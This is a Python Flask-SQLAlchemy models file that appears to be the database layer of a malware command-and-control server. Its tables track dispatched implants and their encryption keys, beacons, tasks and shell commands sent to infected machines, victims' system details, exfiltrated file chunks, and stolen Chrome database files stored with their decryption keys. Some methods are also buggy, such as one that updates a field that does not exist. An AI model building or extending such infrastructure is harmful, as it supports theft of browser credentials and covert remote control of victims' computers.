from datetime import datetime
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

class Dispatched(db.Model):
    # this table is used to track the malware it dispatched
    __tablename__ = 'dispatched'
    id = db.Column(db.Integer, primary_key=True)  # Unique ID
    key_aes = db.Column(db.String(255), nullable=False)  # key for aes encryption of the message
    key_kdf = db.Column(db.String(255), nullable=False)  # key for kdf for next message_key
    date_dispatched = db.Column(db.DateTime, default=datetime.utcnow)  # DateDispatched
    serial_num = db.Column(db.String(255), nullable=False, unique=True)
    current_task = db.Column(db.Integer, nullable=False)
    
    @classmethod
    def add_entry(cls, key_aes, key_kdf, serial_num, current_task):
        """
        Adds a new entry to the dispatched table.

        :param symmetric_key: The symmetric key for the malware.
        :param serial_num: The serial number associated with the dispatch.
        """
        new_entry = cls(key_aes=key_aes, key_kdf=key_kdf, serial_num=serial_num, current_task=current_task)
        db.session.add(new_entry)
        try:
            db.session.commit()
            return new_entry
        except Exception as e:
            db.session.rollback()
            # Handle or log the exception as appropriate
            raise e

    @classmethod
    def update_symmetric_key(cls, serial_num, new_symmetric_key):
        """
        Updates the symmetric_key of a Dispatched entry.

        :param entry_id: The ID of the Dispatched entry to update.
        :param new_symmetric_key: The new symmetric_key value.
        :return: True if the update was successful, False otherwise.
        """
        entry = cls.query.filter_by(serial_num=serial_num).first()
        if not entry:
            print(f"No entry found with serial number {serial_num}")
            return False
        
        entry.symmetric_key = new_symmetric_key
        try:
            db.session.commit()
            return True
        except Exception as e:
            db.session.rollback()
            # Handle or log the exception as appropriate
            raise e

    @classmethod
    def update_current_task(cls, serial_num, current_task):
        """
        Updates the current_task of a Dispatched entry.

        :param entry_id: The ID of the Dispatched entry to update.
        :param current_task: The new current_task value.
        :return: True if the update was successful, False otherwise.
        """
        entry = cls.query.filter_by(serial_num=serial_num).first()
        if not entry:
            print(f"No entry found with serial number {serial_num}")
            return False
        
        entry.current_task = current_task
        try:
            db.session.commit()
            return True
        except Exception as e:
            db.session.rollback()
            # Handle or log the exception as appropriate
            raise e

class Loot(db.Model):
    # This table is used to store the loot (chrome file)
    __tablename__ = 'loot'
    id = db.Column(db.Integer, primary_key=True)  # Unique ID
    serial_num = db.Column(db.String(255), nullable=False)
    encrypt_key = db.Column(db.String(255), nullable=True)  # SymmetricKey
    received_time = db.Column(db.DateTime, default=datetime.utcnow, nullable=True)  # Date received
    chromeDBFile = db.Column(db.LargeBinary, nullable=True)

class RegisteredImplants(db.Model):
    # this table is used to track the malware it dispatched
    __tablename__ = 'registered'
    id = db.Column(db.Integer, primary_key=True) 
    date_registered = db.Column(db.DateTime, default=datetime.utcnow)  # DateDispatched
    
    client_pk = db.Column(db.LargeBinary(255), nullable=False)
    server_pk_dedicated = db.Column(db.LargeBinary(255), nullable=False)
    server_sk_dedicated = db.Column(db.LargeBinary(255), nullable=False)

    server_tk = db.Column(db.LargeBinary(255), nullable=True)  # symmetric key for sending message
    server_rk = db.Column(db.LargeBinary(255), nullable=True)  # symmetric key for receiving message
    
    server_tk_ephemeral = db.Column(db.LargeBinary(255), nullable=True)  # symmetric key for sending message
    nonce_send = db.Column(db.LargeBinary(255), nullable=True) # nonce for sending message
    key_kdf_send = db.Column(db.LargeBinary(255), nullable=True) # key to generate next send nonce

    server_rk_ephemeral = db.Column(db.LargeBinary(255), nullable=True)  # symmetric key for receiving message
    nonce_rcv = db.Column(db.LargeBinary(255), nullable=True)  # nonce for sending message
    key_kdf_rcv = db.Column(db.LargeBinary(255), nullable=True) # key to generate next rcv nonce

    client_guid = db.Column(db.String(255), nullable=False)
    key_kdf_guid = db.Column(db.LargeBinary(255), nullable=True)  # the key to derive the next approved client_guid_e and 

    ratchet_times = db.Column(db.Integer, nullable=False)
    last_connection = db.Column(db.DateTime, nullable=True)

class ImplantsTask(db.Model):
    __tablename__ = 'implantsTask'
    id = db.Column(db.Integer, primary_key=True)
    client_guid = db.Column(db.String(255), nullable=False) # Verify client_guid
    current_task = db.Column(db.Integer, nullable=False)  # Current Task
    current_args = db.Column(db.String(255), nullable=False)  # Current Task Args
    comment = db.Column(db.String(255), nullable=True)
    date_commited = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)


class approvedURL(db.Model):
    __tablename__ = 'approvedURL'
    id = db.Column(db.Integer, primary_key=True)
    client_guid = db.Column(db.String(255), nullable=False, unique=True)
    client_guid_ephemeral = db.Column(db.String(512), nullable=False) # Verify client_guid
    url_next = db.Column(db.String(255), nullable=False)

class Beacon(db.Model):
    # This table is used to track the 
    __tablename__ = 'Beacon'
    id = db.Column(db.Integer, primary_key=True)  # Unique ID for the DB
    guid = db.Column(db.String(255), nullable=False, unique=True)  # Unique Identifier for the malware
    last_connection = db.Column(db.DateTime, default=datetime.utcnow, nullable=True)  # Last time we got connected back
    
    @classmethod
    def add_or_update_beacon(cls, guid):
        # Try to find an existing beacon with the given serial number
        existing_beacon = Beacon.query.filter_by(guid=guid).first()

        if existing_beacon:
            # If found, update the last_connection time (or any other field you wish to update)
            existing_beacon.last_connection = datetime.utcnow()
            print(f"Updated beacon with serial number {guid}.")
        else:
            # If not found, create a new beacon entry
            new_beacon = Beacon(guid=guid)
            db.session.add(new_beacon)
            print(f"Added new beacon with serial number {guid}.")

        # Commit changes to the database
        db.session.commit()

class Files(db.Model):
    # this table is used to track the malware it dispatched
    __tablename__ = 'Files'
    id = db.Column(db.Integer, primary_key=True)  # Unique ID
    filename = db.Column(db.String(255), nullable=False)  # SymmetricKey
    filecontent = db.Column(db.LargeBinary, nullable=True)  # DateDispatched

class infoGathered(db.Model):
    # This table is used to track the information gathered by implant
    __tablename__ = 'infogathered'
    id = db.Column(db.Integer, primary_key=True)  # Unique ID for the DB
    client_guid = db.Column(db.String(128), nullable=False)  # Unique Identifier for the malware
    date_logged = db.Column(db.DateTime, default=datetime.utcnow, nullable=True)

    username = db.Column(db.String(256), nullable=True)
    windows = db.Column(db.String(256), nullable=True) 
    CPU = db.Column(db.String(256), nullable=True)
    devicename = db.Column(db.String(256), nullable=True)
    mem = db.Column(db.String(256), nullable=True)

class ShellCommandLog(db.Model):
    # This table is used to track the information gathered by implant
    __tablename__ = 'shellCommandLog'
    id = db.Column(db.Integer, primary_key=True)  # Unique ID for the DB
    date_logged = db.Column(db.DateTime, default=datetime.utcnow, nullable=True)

    client_guid = db.Column(db.String(128), nullable=False)  # Unique Identifier for the malware
    command_executed = db.Column(db.String(128), nullable=False) 
    result = db.Column(db.String(1024*1024*4), nullable=False)

class FileLoot(db.Model):
    # This table is used to track the information gathered by implant
    __tablename__ = 'fileLoot'
    id = db.Column(db.Integer, primary_key=True)  # Unique ID for the DB
    date_logged = db.Column(db.DateTime, default=datetime.utcnow, nullable=True)

    client_guid = db.Column(db.String(128), nullable=False)  # Unique Identifier for the malware
    order = db.Column(db.Integer, nullable=False) 
    filename = db.Column(db.String(512), nullable=False)
    fileSize = db.Column(db.Integer, nullable=False)
    chunk = db.Column(db.LargeBinary(1024 * 1024 * 3), nullable=False)

class FileDownloaded(db.Model):
    # This table is used to track the information gathered by implant
    __tablename__ = 'fileDownloaded'
    id = db.Column(db.Integer, primary_key=True)  # Unique ID for the DB
    date_logged = db.Column(db.DateTime, default=datetime.utcnow, nullable=True)

    client_guid = db.Column(db.String(128), nullable=False)  # Unique Identifier for the malware
    file_name = db.Column(db.String(256), nullable=False)
    file_path_source = db.Column(db.String(256), nullable=False)
    file_size = db.Column(db.Integer, nullable=False)

    @classmethod
    def add_or_update_filedownload(cls, guid):
        # Try to find an existing beacon with the given serial number
        existing_beacon = Beacon.query.filter_by(guid=guid).first()

        if existing_beacon:
            # If found, update the last_connection time (or any other field you wish to update)
            existing_beacon.last_connection = datetime.utcnow()
            print(f"Updated beacon with serial number {guid}.")
        else:
            # If not found, create a new beacon entry
            new_beacon = Beacon(guid=guid)
            db.session.add(new_beacon)
            print(f"Added new beacon with serial number {guid}.")

        # Commit changes to the database
        db.session.commit()

class ChromeStealer(db.Model):
    # This table is used to track the information gathered by implant
    __tablename__ = 'chromeStealer'
    id = db.Column(db.Integer, primary_key=True)  # Unique ID for the DB
    date_logged = db.Column(db.DateTime, default=datetime.utcnow, nullable=True)
    client_guid = db.Column(db.String(128), nullable=False)  # Unique Identifier for the malware
    
    encryption_key = db.Column(db.String(1024), nullable=False)
    chrome_file = db.Column(db.LargeBinary(1024 * 1024), nullable=False)